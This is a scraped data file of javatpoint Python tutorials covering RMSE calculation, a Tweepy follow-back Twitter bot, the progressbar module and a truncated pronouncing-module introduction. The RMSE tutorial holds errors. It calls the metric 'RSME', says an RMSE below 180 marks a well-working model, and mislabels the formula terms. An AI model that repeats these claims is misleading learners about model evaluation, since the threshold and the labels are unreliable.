453,['RSME - Root Mean Square Error in Python'],"[""This tutorial will learn about the RSME (Root Mean Square Error) and its implementation in Python. Let's get started with its brief introduction.""]","['https://www.javatpoint.com/building-a-twitter-bot-using-python', 'https://www.javatpoint.com/celery-tutorial-using-python', 'https://www.javatpoint.com/building-a-twitter-bot-using-python', 'https://www.javatpoint.com/celery-tutorial-using-python', 'https://www.javatpoint.com/building-a-twitter-bot-using-python']",['https://static.javatpoint.com/python/images/rsme-root-mean-square-error-in-python.png'],[],"['Introduction', 'Conclusion']","['Mean Square Error (MSE)', 'Root Mean Square Error (RMSE)', 'Root Mean Square Error with NumPy module']","[""Note - If your system don't have numpy and sklearn libraries, you can install using the below commands.""]","[""Error metric allows us to track the various matrices' efficiency and accuracy. These matrices are given below."", 'Parameters -', 'It returns a non-negative floating point value (the best value is 0.0) or an array of floating point values, one for each individual target.', ""Let's understand the following example."", 'Example - 1', 'Example - 2:', 'Using RSME, we can easily measure the efficiency of the model.', ""Let's breakdown the above formula -"", ""We will implement the RSME using the functions of the Numpy module. Let's understand the following example."", 'Explanation -']","['MSE is a risk method that facilitates us to signify the average squared difference between the predicted and the actual value of a feature or variable. It is calculated using the below method. The syntax is given below.', 'RMSE is a square root of value gathered from the mean square error function. It helps us plot a difference between the estimate and actual value of a parameter of the model.', 'A well-working algorithm is known if its RSME score of less than 180. Anyhow, if the RSME value surpasses 180, we need to apply feature selection and hyper-parameter tuning on the model parameter.', ""RSME is a square root of the average squared difference between the predicted and actual value of the variable/feature. Let's see the following formula.""]","['RSME (Root mean square error) calculates the transformation between values predicted by a model and actual values. In other words, it is one such error in the technique of measuring the precision and error rate of any machine learning algorithm of a regression problem.', ""We calculated the difference between predicted and actual values in the above program using numpy.subtract() function. First, we defined two lists that contain actual and predicted values. Then we calculated the mean of actual and predicted values difference using the numpy's squre() method. Finally we calculated the rmse."", 'In this tutorial, we have discussed how to calculate root square mean square using Python with illustration of example. It is mostly used to find the accuracy of given dataset. If RSME returns 0; it means there is no difference predicted and observed values.']","[""sklearn.metrics.mean_squared_error(y_true, y_pred, *, sample_weight=None, multioutput='uniform_average', squared=True)"", 'import math', 'import sklearn.metrics', 'actual = [0, 1, 2, 0, 3]', 'predicted = [0.2, 2.3, 4.5, 0.5, 1.1]', 'mse = sklearn.metrics.mean_squared_error(actual, predicted)', 'rmse = math.sqrt(mse)', 'print(""The difference between actual and predicted values"", rmse)', 'from sklearn.metrics import mean_squared_error', '# Given values', 'Y_act = [1,4,3,2,6] # Y_true = Y (original values)', '# calculated values', ""Y_pred = [0.6,1.29,1.99,2.69,3.4] # Y_pred = Y'"", '# Calculation of Mean Squared Error (MSE)', 'mean_squared_error(Y_act,Y_pred)', 'pip install numpy', 'pip install sklearn', 'import math', 'import numpy as np', 'actual = [1,3,6,4,2]', 'predicted = [2.6,1.5,3.9,7,4.1]', 'MSE = np.square(np.subtract(actual,predicted)).mean()', 'rsme = math.sqrt(MSE)', 'print(""Root Mean Square Error:\\n"")', 'print(rsme)']","['The difference between actual and predicted values: 1.5388307249337076', '3.15206', 'Root Mean Square Error:', '2.127439775880859']",[],"['|||Mean Square Error (MSE)|||Root Mean Square Error (RSME)|||R-square|||Accuracy|||MAPE, etc.||||||y_true - It is an array-like target_values or n_samples.|||y_pred - It is a estimated target values.|||sample_weight (optional) - It represents the sample weight.|||Multioutput {raw_values, uniform_average} - It defines the aggregating of multiple output values. The raw_values returns a complete set of error for multi output input and the uniform_average is an error of all outputs with the uniform weight.|||Squared - True, returns MSE value otherwise returns RSME value.||||||Σ - It represents the ""sum"".|||di- It represents the predicted value for the ith|||pi- It represents the predicted value for the ith|||n - It represents the sample size.|||']"
454,['Building a Twitter Bot using Python'],"['In the following tutorial, we will learn how to build our very own Twitter Bot in the Python programming language with the help of the Tweepy package, which provides an efficient way to use the Twitter Application Programming Interface (API).']","['https://www.javatpoint.com/python-progressbar-module', 'https://www.javatpoint.com/rsme-root-mean-square-error-in-python', 'https://www.javatpoint.com/https://developer.twitter.com/en', 'https://www.javatpoint.com/python-progressbar-module', 'https://www.javatpoint.com/rsme-root-mean-square-error-in-python', 'https://www.javatpoint.com/python-progressbar-module']",[],[],"['Understanding the Twitter API', 'Understanding the Python Tweepy package', 'Using the Python Tweepy package', 'Making a Twitter Bot in Python using Tweepy']","['Installation', 'Creating Twitter API Authentication Credentials', 'Applying for a Twitter Developer Account', 'Creating an application', 'Creating the Authentication Credentials', 'Reviewing of Tweepy Functionality', 'Understanding OAuth', 'Understanding the API Class', 'Methods for User Timelines', 'Methods for Tweets', 'Methods for Users', 'Methods for Followers', 'Methods for the Account', 'Methods for Streaming', 'Models', 'Cursors', 'Watching for Twitter Activity', 'Follow Followers bot', 'Execution of the Bot']",['Note: All the credentials utilized in this article are only for understanding and will not work. We are required to generate and utilize our credentials.'],"['By the end of this tutorial, we will be able to learn the following:', 'But before getting started, let us briefly look into the Twitter API.', 'Technically, the API exposes various endpoints of HTTP associated with:', 'The Tweepy package, as we will discuss later, offers a method to invoke those HTTP endpoints without dealing with low-level details.', 'One can find more details about the policies of the Twitter API and limits in its official documentation.', 'Let us now understand the Tweepy package.', 'Let us begin by installing the package.', 'The above commands will create the virtual environment within the project directory.', 'We will use this requirements.txt file when we are deploying the project.', 'Step 1: Applying for a Twitter Developer Account', 'Step 2: Creating an application', 'Step 3: Creating the authentication credentials', 'First of all, we have to go to the Twitter developer site to apply for a developer account. The link to the website can be found below:', 'https://developer.twitter.com/en', 'Here, we need to select the Twitter user responsible for this account. It must be our organization or us.', 'Twitter will then request a few details about how we plan to utilize the developer account.', 'We will then need to specify the name of the developer account and if we are planning to utilize it for personal usage or the organization.', 'We must go to the Twitter apps page in order to register the application and select the Create an app option.', 'We will then provide the following details associated with the application and its purpose:', 'We can test the credentials with the help of the following snippet of code:', 'Explanation:', 'Now that we know how Tweepy names things let us understand how it works.', 'We can divide the functionality of Tweepy into the following groups:', 'Now we are about to investigate these groups to learn about the functionality each one provides.', 'The following snippet of code illustrates how we can create an OAuthHandler object that we can use later for API calls:', 'Explanation:', 'Explanation:', 'The methods of API can be grouped into the following categories:', ""These methods deal with reading tweets, mentions, and retweets from the timeline or any other user's timeline if it is public."", 'Let us consider the following snippet of code that prints the author and the text of the last tweets in the home timeline:', 'Explanation:', 'Explanation:', 'In the above snippet of code, we have used the update_status() method in order to create a new tweet from a Python string.', 'Let us consider the following snippet of code to fetch the details of the user and print it along with the 20 most recent followers:', 'Explanation:', 'This group of methods deals with the following and unfollowing users, querying the followers of users and listing the accounts any user is following.', 'Let us consider the following snippet of code that shows how we can use Tweepy to start following some users.', 'Explanation:', 'In the above snippet of code, we have used the create_friendship() method to add the user to the list of accounts we follow.', 'These methods enable us to read and write our own profile details.', 'Let us consider the following snippet of code that shows how we can update our profile description:', 'Explanation:', 'We need to create two objects to use streaming:', 'Let us consider the following snippet of code that demonstrates the same:', 'Explanation:', 'The model classes are as follows:', 'Let us consider an example where we need to fetch every tweet in which we are mentioned, and then mark each tweet as Liked and follow its author:', 'Explanation:', 'Leveraging Tweepy models allows us to create concise and understandable code.', 'Explanation:', 'There are two ways to watch for Twitter activity continuously:', 'Let us consider the following source code that demonstrates the same.', 'Explanation:', 'The function uses the os.getenv() function to read environment variables and then creates the Tweepy the_auth object. Then the API object is created.', 'Before returning the API object, the createApi() function calls the verify_credentials() method to check valid credentials.']","['Twitter is considered among the most widely adopted social networks. For many organizations and people, having a great Twitter presence is a chief factor in keeping their audience engaged.', 'The Twitter API provides developers access to almost every function of Twitter. We can utilize the API in order to read and write information associated with the entities of Twitter, which includes tweets, users, and trends.', 'We can use almost every functionality offered by Twitter API through Tweepy. As of version 3.7.0, the only current limitation is that Direct Messages do not work properly due to some recent alterations in the Twitter API.', 'The following section will discuss how we can install the Tweepy package for development, configure authentication credentials, and interact with the Twitter API.', 'We can install the Tweepy package using pip, a Python package manager. In the following section, we are about to use a virtual environment (virtualenv) for the projects to avoid depending on system-wide packages.', 'We can create a project named tweepyBots. The primary step is to create a directory and a virtual environment. Let us consider the following syntax for the same:', 'Then we can install the Tweepy package. First, we have to activate the newly created virtual environment and then utilize the pip installer to do the installation.', ""Now that the Tweepy package is installed let's create a requirements.txt file consisting of the names of the dependencies. We can use the pip command freeze for this task as shown below:"", 'As we have discussed earlier, the Twitter API requires that all requests use OAuth in order to authenticate. Thus, we have to create the required authentication credentials to be able to use the API. These credentials are four text strings:', 'If we already have a Twitter user account, follow these steps to create the key, token, and secrets. Otherwise, we need to sign up as a Twitter user before proceeding.', 'Twitter grants authentication credentials to applications, not accounts. An application can be any utility or bot that uses the Twitter API. Thus, we have to register the application to be able to make API calls.', 'We can go to the Twitter apps page to create the authentication credentials. Here we will find the Details button of the application. Once we click this button, we will be taken to the next page, where we can generate the credentials.', 'By selecting the Keys and tokens tab, we can generate and copy the key, token, and secret to utilize them in the code. Once we are done generating the credential, we can save them to use in the code later.', 'Since, over time, the names of different concepts of Twitter have evolved, some old names are still utilized in Tweepy. Thus, it is better to remember that, in the context of this tutorial, these equivalences hold:', 'The Tweepy package takes care of all the information using OAuth required by the Twitter API to authenticate each request. It offers an OAuthHandler class that we can use to set the credentials in all API calls.', 'Here we are telling Tweepy to use the credentials we created in Step 3: Creating the Authentication Credentials. It is mandatory to replay CONSUMER_KEY, CONSUMER_SECRET, ACCESS_TOKEN, and ACCESS_TOKEN_SECRET with the previously generated values.', 'The API class consists of multiple methods that offer access to Twitter API endpoints. With the help of these methods, we can access the functionality of the Twitter API.', 'We have set the authentication credentials and created an API object in the above snippet of code. We can invoke the methods of this object in order to perform any API call.', 'In the following sub-sections, we are about to review various groups of API methods. We can visit the complete documentation of the API Class for a detailed list of all API methods.', 'The methods deal with creating, fetching, and retweeting tweets. Let us consider the following snippet of code that illustrates the use of the Tweepy package in creating a tweet with some text:', 'Methods in this group allow us to search users with a filter criterion, fetch details of a user, and list the followers of any user if that user account is public.', 'In the above snippet of code, we have used the update_profile() method within which we have passed the description argument in order to change the profile description to ""Welcome to javatpoint.com"".', 'Streaming allows us to watch for tweets actively that match specific criteria in real-time. This statement implies that when no new tweets match the criteria, the program will wait until a new tweet is created and processed.', 'Tweepy utilizes its model classes to encapsulate the responses from different Twitter API methods. This provides us with a convenient method to use the outputs from API operations.', 'A lot of Twitter API endpoints utilize pagination in order to return their outputs. By default, each method returns the first page, which generally consists of some dozen items.', 'Let us consider the following snippet of code that illustrates how we can get the first page from the timeline and the last hundred tweets with the help of a cursor.', 'Now that we have understood the working of Tweepy let us see how we can make a Twitter bot in Python with Tweepy. Bots work by continuously watching for some Twitter activity and automatically reacting to it.', 'Which option to choose depends on the use case. Using streams is the most efficient option, but then we can only watch activity related to tweets, so it is less flexible. In the following section, we will be using only one option to build a bot.', 'In the above snippet of code, we have imported the required libraries. We then defined a function as createApi() that reads the authentication credentials from environment variables and creates the Tweepy API object. These credentials are:', 'We have then passed wait_on_rate_limit and wait_on_rate_limit_notify in the creation of the tweepy.API object makes Tweepy wait and print a message when the rate limit is exceeded.', 'We can observe that we have also used the logging Python module to inform errors and info messages that support us debugging them if any problem arises.', 'We have also defined the main() function that creates a Tweepy API object using the createApi() function. We have called the followFollowers() function once every minute within a loop.', 'We have also defined the followFollowers() function that uses a Tweepy cursor and the Tweepy API method followers() to get the list of followers. This list consists of a Tweepy user model for each user following us.', 'Then the bot iterates through the list and utilizes the following attribute to check if we are already following each user. Users that are not already being followed are followed with the help of the follow() function.', 'We must first create the environment variables for the authentication credentials. We can perform this by replacing the values with the actual credentials.', 'Once the environment variables containing the credentials required to use the Twitter API are set, we need to activate the virtual environment and execute the Python project file.', 'While it is executing, the bot will follow anybody who follows us. We can test that it works by unfollowing someone that is following us. After a minute, they will be followed again. We can stop the bot using Ctrl + C.']","[""A Great Twitter presence means being involved in activities like keeping an active account with new tweets and retweets, following interesting accounts, and quickly replying to the followers' messages. We can perform all this work manually; however, that can take time. Instead, we can depend on a Twitter bot, a program that automates all or part of the Twitter activity."", 'The Twitter API utilizes OAuth, a widely used open authorization protocol, to authenticate all the requests. Before making any call to the Twitter API, we have to create and configure the authentication credentials. We will be looking into the detailed instructions for this later in this tutorial.', 'We can leverage the Twitter API to build various kinds of automation, like bots, analytics, and other utilities. The thing to remember is that Twitter imposes certain restrictions and policies related to what we can and cannot build with the help of its API. The tools developed to spam, mislead users, and other activities are forbidden. This is done to guarantee users a good experience.', 'The Twitter API also imposes rate limits about how commonly we are allowed to invoke the methods of API. If we exceed these limits, we will have to wait for around 5 to 15 minutes to be able to use the API again. We must consider this while designing and implementing bots to avoid unnecessary waits.', 'Tweepy is an open-source Python package that provides us with an efficient way to access the Twitter API using Python. The Tweepy package consists of a set of classes and methods that depicts the models of Twitter and API endpoints, and it transparently handles different implementation details, like:', 'If we were not using the Tweepy package, we would have to deal with low-level details related to HTTP requests, rate limits, authentication, and data serialization. The entire procedure could be time-consuming and prone to error. Instead, thanks to Tweepy, we can focus on the functionality we want to build.', 'In the above snippet of code, we have imported the required package. We created an object of the OAuthHandler class of the Tweepy package to authenticate to Twitter. We have then created an object of the API class. Later, we used the try-expect method, where we used the verify_credentials() function and printed some statements regarding the same. If everything goes well, we should see a message saying Authentication Successful.', 'Tweepy provides an interface to its users in order to access the Twitter API from the Python programming language. It does so by encapsulating much of the complexity of the Twitter API and adding a model layer along with some of the useful functionalities on top of it.', 'In the above snippet of code, we have imported the required package. We have then created an object of the OAuthHandler class specifying the consumer key and consumer secret as its parameters and used the set_access_token() function providing the access token and its secret in order to authenticate to Twitter.', 'Let us consider the following snippet of code that illustrates the creation of an API object that we can use to invoke Twitter API. We will also be setting the wait_on_rate_limit and wait_on_rate_limit_notify arguments to True to make sure that the API object prints a message and waits if the rate limit is exceeded:', 'In the above snippet of code, we have used the home_timeline() method of the API class. This method is used to get the last twenty entries in the timeline. 20 is the default value in the Tweepy package. We will see how to get more than 20 results later and work with paginated results.', 'In the above snippet of code, we have used the get_user() method that returns an object consisting of the details of the user. This returned object also has methods to access information related to the user. We have then used the followers attribute to get the list of followers and print their names.', 'In the above snippet of code, we have imported the required modules and created a class of StreamListener. This class is used for the stream listener tweetsListener. We reused the common code to all stream listeners by extending the StreamListener of the Tweepy package. Tweets from the stream are processed by the onStatus() function.', 'We have created the stream with the help of the tweepy.Stream, passing the authentication credentials and our stream listener. We have to call the filter() function to get tweets from the stream, passing the criteria through filtering tweets. Then, for each new tweet that matches the criteria, the stream object invokes the onStatus() function of the stream listener.', 'In the above snippet of code, we have used the mentions_timeline() belonging to the Status class that returns a tweet object. We have then used the favorite() method to mark it as Liked. We have then used the user attribute along with the follow() method to add the author of the tweet to the list of people we follow.', 'Tweepy cursors take away part of the complexity of working with paginated outputs. Cursors are implemented as a Tweepy class named Cursor. The Cursor object takes care of fetching the different result pages transparently. We can use a cursor by selecting the API method to fetch items and the number of items we want.', 'In the above snippet of code, we have created a cursor object using tweepy.Cursor. The class constructor receives an API method to utilize as the source for results. In the above example, we have used the home_timeline() function as the source as we wanted tweets from the timeline. The Cursor object has an items() method that returns an iterable we can use to iterate over the results. We can pass items() the number of result items we want to get.', 'We will learn how to build the follow followers bot that automatically follows anyone who follows us in the following section. This bot gets the list of the followers from Twitter every minute and then iterates through it to follow each user that we are not already following.']","['$ mkdir tweepyBots', '$ cd tweepyBots', '$ python3 -m venv tweepyEnv', '$ path_to_the_tweepyEv_directory ./script/activate.bat', '$ pip install tweepy', '$ pip freeze > requirements.txt', '# importing the required library', 'import tweepy', '# Authenticating to Twitter', 'authCreds = tweepy.OAuthHandler(""pGBDoAaEpkuiVKBOLwjtcmHGc"",', '""xF3g1wrP50b6BlZEd20u4oVfjgH1FGQcuSUzlQO5aUWOufvlhw"")', 'authCreds.set_access_token(""642518493-6VcLIQprbQbv9wkcBBPvCle8vsjU9fE85Dq9oStl"",', '""tH9aKQbQQ1iRdYTcLSsPwitl44BkAc6jikrsU0ifnXvZhq"")', '# creating an object of the API class', 'apiObj = tweepy.API(authCreds)', '# verifying credentials', 'apiObj.verify_credentials()', 'print(""Authentication Successful"")', 'except:', 'print(""Error raised during authentication"")', '# importing the required package', 'import tweepy', '# Authenticating to Twitter', 'authCreds = tweepy.OAuthHandler(""CONSUMER_KEY"", ""CONSUMER_SECRET"")', 'authCreds.set_access_token(""ACCESS_TOKEN"", ""ACCESS_TOKEN_SECRET"")', '# importing the required package', 'import tweepy', '# Authenticating to Twitter', 'authCreds = tweepy.OAuthHandler(""CONSUMER_KEY"", ""CONSUMER_SECRET"")', 'authCreds.set_access_token(""ACCESS_TOKEN"", ""ACCESS_TOKEN_SECRET"")', '# Creating an object of the API class', 'apiObj = tweepy.API(', 'authCreds,', 'wait_on_rate_limit = True,', 'wait_on_rate_limit_notify = True', '# using the home_timeline() method', 'time_line = apiObj.home_timeline()', 'for the_tweet in time_line:', 'print(f""{the_tweet.user.name} said {the_tweet.text}"")', '# using the update_status() method', 'apiObj.update_status(""This is a test tweet to learn Tweepy Python"")', '# using the get_user() method', 'the_user = apiObj.get_user(""Name of some user"")', '# printing the details of the user like name, description, location', 'print(""Details of the User:"")', 'print(the_user.name)', 'print(the_user.description)', 'print(the_user.location)', '# printing the last 20 followers of the user', 'print(""Last 20 Followers of the User:"")', 'for the_follower in the_user.followers():', 'print(the_follower.name)', '# using the create_friendship() method', 'apiObj.create_friendship(""user_name"")', '# using the update_profile() method', 'apiObj.update_profile(description = ""Welcome to javatpoint.com"")', '# importing the required modules', 'import json', 'import tweepy', '# defining a Class', 'class TheStreamListener(tweepy.StreamListener):', 'def __init__(self, api):', 'self.api = api', 'self.me = api.me()', 'def onStatus(self, tweet):', 'print(f""{tweet.user.name}:{tweet.text}"")', 'def onError(self, status):', 'print(""Error detected"")', '# Authenticating to Twitter', 'the_auth = tweepy.OAuthHandler(""CONSUMER_KEY"", ""CONSUMER_SECRET"")', 'the_auth.set_access_token(""ACCESS_TOKEN"", ""ACCESS_TOKEN_SECRET"")', '# Creating API object', 'the_api = tweepy.API(', 'the_auth, wait_on_rate_limit = True,', 'wait_on_rate_limit_notify = True', 'tweetsListener = TheStreamListener(the_api)', 'the_stream = tweepy.Stream(the_api.auth, tweetsListener)', 'the_stream.filter(track = [""Python"", ""Django"", ""Tweepy""], languages = [""en""])', '# using the mentions_timeline() method', 'the_tweets = apiObj.mentions_timeline()', 'for the_tweet in the_tweets:', 'the_tweet.favorite()', 'the_tweet.user.follow()', '# using the Cursor method', 'for the_tweet in tweepy.Cursor(apiObj.home_timeline).items(100):', 'print(f""{the_tweet.user.name} said: {the_tweet.text}"")', '# importing the required libraries', 'import tweepy', 'import logging', 'import os', 'import time', 'logging.basicConfig(level = logging.INFO)', 'logger = logging.getLogger()', '# defining the createApi() function', 'def createApi():', 'consumerKey = os.getenv(""CONSUMER_KEY"")', 'consumerSecret = os.getenv(""CONSUMER_SECRET"")', 'accessToken = os.getenv(""ACCESS_TOKEN"")', 'accessTokenSecret = os.getenv(""ACCESS_TOKEN_SECRET"")', 'the_auth = tweepy.OAuthHandler(consumerKey, consumerSecret)', 'the_auth.set_access_token(accessToken, accessTokenSecret)', 'api = tweepy.API(', 'the_auth,', 'wait_on_rate_limit = True,', 'wait_on_rate_limit_notify = True', ')', 'try:', 'api.verify_credentials()', 'except Exception as e:', 'logger.error(""Error creating API"", exc_info = True)', 'raise e', 'logger.info(""API created"")', 'return api', '# defining the followFollowers() function', 'def followFollowers(the_api):', 'logger.info(""Retrieving and following followers"")', 'for the_follower in tweepy.Cursor(the_api.followers).items():', 'if not the_follower.following:', 'logger.info(f""Following {the_follower.name}"")', 'the_follower.follow()', '# defining the main() function', 'def main():', 'the_api = createApi()', 'while True:', 'followFollowers(the_api)', 'logger.info(""Waiting..."")', 'time.sleep(60)', 'if __name__ == ""__main__"":', 'main()', '$ path_to_the_tweepyEv_directory ./script/activate.bat', '$ python followFollowersBot.py']",[],[],"['|||Improving and automating the interactions with the Twitter audience|||Installing Tweepy|||Signing up as a Twitter developer to utilize its API|||Utilizing Tweepy in order to invoke the Twitter API|||Building a Twitter Bot||||||Tweets|||Retweets|||Likes|||Favorites|||Direct messages|||Media|||Trends||||||Data encoding and decoding|||Results pagination|||HTTP requests|||OAuth authentication|||Streams|||Rate limits||||||Consumer key|||Consumer secret|||Access token|||Access secret||||||Name of the Application: This information will serve as the name to identify the application (For example, testbot)|||Description of the Application: This information will serve as the purpose of the application (For example, test bot to learn about tweepy)|||Website URL for the application: This information is required; however, we can use the URL to some personal websites as the bots do not require a URL to function.|||Use of the application: This information tells how users will utilize the application (For example, this application is a bot that will automatically respond to users)||||||A status is referred to as a tweet.|||A friendship is considered a follow-follower relationship.|||A favorite is equivalent to a like.||||||OAuth|||The API classes|||Models|||Cursors|||Streams||||||Methods for user timelines|||Methods for tweets|||Methods for users|||Methods for followers|||Methods for the account|||Methods for likes|||Methods for blocking users|||Methods for searches|||Methods for trends|||Methods for streaming||||||The stream object utilizes the Twitter API to get tweets that match a few criteria. This object is the source of tweets processed by a stream listener.|||The stream listener receives tweets from the stream.||||||User|||Status|||Friendship|||SearchResults||||||Using streams: to be notified when new content, such as tweets, that matches specific criteria is created|||Using polling: to make Tweepy API calls periodically and then check their results to see if they consist of something new||||||CONSUMER_KEY|||CONSUMER_SECRET|||ACCESS_TOKEN|||ACCESS_TOKEN_SECRET|||']"
455,['Python Progressbar Module'],"[""It is very basic human nature that we would like to know when the given process will be complete and what percentage of the given task is done. This is because we become very impatient while a process is going on, and we have only to wait until it is completed. This is very understandable because it is our nature to remain curious about what is happening and when it is happening. Therefore, we always try to find out when the given task will complete and how much time will the given task take to complete. For example, when we are downloading a file or software, we always look for how much time is remaining or how much time will take to download the file. Thus, we can say that if a given time or given percentage is available to us, we will lesser impatient than we can feel if we don't know about these points. Sometimes, visual illustration of downloading the file also helps keep calm and stay patient until the process is completed. This is because the visual illustration of downloading a file tells us that this much percentage of the file is downloaded or this much is remaining. But actually, these visual illustrations are not meant to be Indicators of downloads, but they actually keep our attention and make downloading or suffering more interactive.""]","['https://www.javatpoint.com/python-pronouncing-module', 'https://www.javatpoint.com/building-a-twitter-bot-using-python', 'https://www.javatpoint.com/python-pronouncing-module', 'https://www.javatpoint.com/building-a-twitter-bot-using-python', 'https://www.javatpoint.com/python-pronouncing-module']","['https://static.javatpoint.com/python/images/python-progressbar-module.png', 'https://static.javatpoint.com/python/images/python-progressbar-module2.png']",[],"['Introduction to Progressbar Module of Python', 'Progressbar Module of Python: Installation', 'Progressbar Module of Python: Implementation', 'Conclusion']",[],[],"['Or, we can also use the following pip command to install the latest version of the progressbar module (progressbar2) in our system:', 'Look at the following example program to understand the implementation of the progressbar module:', 'Example: Look at the following example program where we have created a progress bar using the functions of the progressbar module:']","['In this tutorial, we will create a loading bar or progress bar using the progressbar module of Python. We will use this module in the example programs to understand the implementation of this module.', 'We will use the pip installer method to install the progressbar module in our system, and to install the progressbar module using this method; we have to first write down the following command inside the command prompt terminal of our system:']","[""Visual illustrations have also become very common these days, and they can be seen embedded in almost every application, website, or software. Therefore, we can see that these visual illustrations of the ongoing process (like downloading a file, suffering on a site, etc.) are important aspects of any website, software, or application. Now, most of us would think that it would be very hard to create these video illustrations by ourselves, and it requires hundreds of lines of back-end coding. But, in reality, this is exactly not true, and it is not very difficult to create such visual illustrations by ourselves. Many programming languages offer us packages that we can use to create these video illustrations. Like any other aspect of programming language, Python is also ahead in this aspect. Talking specifically about Python, it offers us many packages such as tqdm, progressbar, etc., which we can use in programs to create progress bars by ourselves. From all the progress bars' packages offered by Python, we will learn only about the progressbar module in this tutorial. We will understand this progressbar module of Python and work on this module by importing it into example programs."", 'Progressbar is a Python module that comes with lots of functions that we can use to create visual illustrations for an ongoing process that will help us distract from the impatience we feel. The progressbar module has many built-in functions which we can use in a Python program to create visual illustrations of the ongoing process and process completion time. This module allows us to create a progress bar for the ongoing process so that we can know how much percentage of the process is completed and how long it will take it to complete. Progress bar or loading bars which we usually see in gaming applications, loading screens, can be created using functions of this module. This loading bar indicates that resources required for starting the application or game are being imported from the main memory of the system or server of the application.', ""The progressbar module of Python is not an in-built package of Python, and it means it requires an installation process to install this module into our system. Since this module doesn't come while installing source Python, we have first to make sure that this module is successfully installed in our system if we want to perform operations using functions of this module. If the progressbar is not already present in our system, we have multiple installation methods which we can use to install the progressbar module into our system, and only after that can we use functions of this module in example programs. One of the easiest and simplest methods to install the progressbar module in our system is using the pip installer."", ""After writing the pip command mentioned above in the prompt shell of our system, we have to press the 'enter,' which will start the installation process of the progressbar (or progressbar2) module. Once the installation process of this module starts, we have to wait for a while until the pip installer installs all the required dependencies for this module."", 'As we can see, the progressbar module is successfully installed in our system with the help of the pip installer. We can also install the progressbar2 module by following the same installation process and writing down the second pip command (given above). We can now move forward with the implementation part of the progressbar module as this module is successfully installed in our system, and now, we can use functions of it in any example programs.', 'In this part, we will import the progressbar module that we have just installed into example programs to use the functions of this module to understand the implementation of this module. We will try to create a progress bar using the functions of this module, and the progressbar will be displayed in the output when the program is executed. The output of the progress bar will depend upon the Python IDE on which we are running the example programs. We can also use progressbar2 as it is the upgraded version of the progressbar module and performs all functions which one can perform using the later one. But, here in this tutorial, we will only import the progressbar module into the example program and use functions of it to understand its implementation.', ""As we can see, the progress bar is printed and shown in the output, and the output displayed will vary according to the Python IDE in which we run this example program. That's how we can create a progress bar or load bar using the functions of the progressbar or progressbar2 module."", ""Explanation: First, we have imported the progressbar module as pgr in the program. After that, we have also imported the time module into the program to use functions of this module to create time-lapse while creating a progressbar. Then, we defined a default function with animeMaker() name and used the progressbar module's functions inside this function to create a progressbar. Inside this default function, first, we have created a widget for the loading bar using the AnimatedMarker() function of the progressbar module. After that, we have defined another variable to create a bar using the ProgressBar function of the progressbar module. Inside this function, we have given widget variable (varWidget) as an argument to define the widget of the loading bar. After that, we have used a for loop in the function so that it can continuously loop over the loading bar, and an animated bar will be displayed in the output. Inside the for loop, first, we have used the sleep() function has been used to display the loading bar status after a break of a given time, i.e., 0.5 seconds. Then, we used the update() function of the progressbar module to update the loading bar in the output up to the given limit in the function, i.e., a, which we defined in the range of 26. Lastly, we displayed the loading bar in the output by calling the animeMaker function."", 'We can create a loading bar or progress bar using the functions of the progressbar or progressbar2 module inside a Python program. The output of the loading bar or progress bar will be dependent on the Python IDE on which we are running our program, and animations of the progress bars may vary according to these IDEs. The progressbar module is very helpful in creating all such kinds of animated progress bars and loading bars.']","['pip install progressbar', 'pip install progressbar2', '# Importing the progressbar module', 'import progressbar as pgr', '# Also importing the time module', 'import time', '# Default functions for a progress bar', 'def animeMaker():', '# Creating widget of the progress bar', ""varWidget = ['Loading: ', pgr.AnimatedMarker()]"", '# Creating bar from the widget', 'varBar = pgr.ProgressBar(widgets = varWidget).start()', '# Using for loop to loop over the progress bar', 'for a in range(26):', '# Using time module to give break in progress bar', 'time.sleep(0.5)', '# Updating the progress bar', 'varBar.update(a)', '# Showing the progress bar in the output', 'print(""Following is the progress bar created using the progress bar module: "")', '# Calling the default function to execute it', 'animeMaker()']",['Following is the progress bar created using the progress bar module:'],[],[]
456,['Python Pronouncing Module'],"[""It is never easy to find rhyming words of the given word, and this becomes even more difficult when we are writing a poem or some rhyming paragraph. Many of us may have heard of CMU pronouncing dictionary and how helpful it is for producing rhyming words. For those of us who don't know what CMU dictionary is, it is an open-source pronouncing dictionary that anyone can use for finding rhyming words, and the Speech Group created it at Carnegie Mellon University. Since it is an open-source dictionary, anyone can use it for free, and it was basically designed for use in speech recognition research. If we don't have any idea of rhyming words of a given word and are looking for them, we can use this CMU dictionary, which is absolutely free. This dictionary provides us with all the rhyming words available of any word from the English language. We just have to visit their website and type the given word in the search box; the result will be displayed with all the rhyming words of the given word in the search box. Thus, it becomes very easy for us to find the rhyming words of any given word, and we don't have to spend too much time thinking about all the rhyming words.""]","['https://www.javatpoint.com/python-pyautogui-module', 'https://www.javatpoint.com/python-progressbar-module', 'https://www.javatpoint.com/python-pyautogui-module', 'https://www.javatpoint.com/python-progressbar-module', 'https://www.javatpoint.com/python-pyautogui-module']","['https://static.javatpoint.com/python/images/python-pronouncing-module.png', 'https://static.javatpoint.com/python/images/python-pronouncing-module2.png', 'https://static.javatpoint.com/python/images/python-pronouncing-module3.png']",[],"['Introduction to Pronouncing Module of Python', 'Pronouncing Module in Python: Installation', 'Pronouncing Module in Python: Implementation']",[],[],"['As we can see, the rhymes() function takes the given word (whose rhymed words will be displayed as a result) as an argument.', 'Look at the following example program to understand the implementation of this pronouncing module:', 'Example 1: Look at the following Python program where we find rhyming words using the pronouncing module:', 'Taking a word input from the user and finding its rhyming words:']","[""As we can see, the rhyming words of the word 'Shine' are printed in the output, and that's how we can use this module to print the rhyming words of any given word."", 'In the following program, we will perform the same operation as we have performed in the first example program, but here, we will take the given word as input from the user. Look at the following example program to understand this implementation:']","['Many programming languages also offer packages that can be used, like CMU pronouncing dictionary to find the rhyming words of any given word of English language. Talking specifically about Python, it has the pronouncing package, which is a very simple interface for the CMU pronouncing dictionary, and we can use this package in a Python program to find rhyming words of any word given in the program. Therefore, we will learn about this pronouncing module of Python in this tutorial. We will learn about its installation and how we can use this module to find rhyming words of any given word in the program.', ""Pronouncing module or library is a simple interface of CMU pronouncing dictionary in Python which anyone can use for finding rhyming words and performing other operations that one can perform using the CMU pronouncing dictionary. There are already many packages available in Python that can be used to find rhyming words, but the best part of this module is that it doesn't require any external dependencies while performing operations, and it is very easy to use. The pronouncing module of Python was created so that one can use the CMU pronouncing dictionary's interface from a Python program without having to install the NLTK or grand behemoth. Using the functions of this module is very easy, and one can easily use this module in any Python program to find out rhyming words of the given word in the program. This module saves lots of time which we can waste while manually thinking or looking for the rhyming words of a given word. We just have to use the functions of this module in a Python program, and all the rhyming words related to the given word will be displayed 